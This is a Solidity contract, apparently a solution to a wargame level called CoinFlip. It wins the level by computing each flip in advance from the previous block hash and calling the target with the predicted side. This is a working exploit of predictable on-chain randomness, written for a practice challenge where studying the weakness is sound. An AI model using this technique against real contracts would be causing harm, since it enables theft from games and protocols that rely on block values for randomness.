// SPDX-License-Identifier: MIT

// This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip.
// To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

pragma solidity ^0.8.17;

import "./CoinFlip.sol";

contract CoinFlipAttack {
    uint256 public consecutiveWins;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinflip;

    constructor(CoinFlip coinflip_) {
        coinflip = coinflip_;
    }

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinflip.flip(side);
    }
}
